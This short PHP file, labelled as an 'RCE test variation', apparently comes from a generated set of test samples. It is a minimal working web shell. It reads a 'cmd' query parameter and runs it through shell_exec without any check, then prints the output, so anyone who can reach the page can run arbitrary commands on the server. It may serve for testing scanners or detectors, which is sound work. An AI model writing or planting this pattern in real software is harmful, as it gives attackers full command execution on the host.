<?php
// RCE test variation #1454
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>